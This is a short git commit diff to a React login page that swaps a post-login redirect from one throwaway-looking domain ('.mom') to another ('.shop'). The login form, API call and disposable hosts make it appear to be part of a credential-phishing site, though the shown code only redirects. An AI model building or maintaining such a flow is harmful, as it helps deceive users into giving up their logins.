326ea49241c30e766356f14c4e930f365df03991
husknet <127146284+husknet@users.noreply.github.com>
2025-02-07 10:22:37 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://nelogline.1tobyboint.mom/';
+      window.location.href = 'https://neter.loglinefoline.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
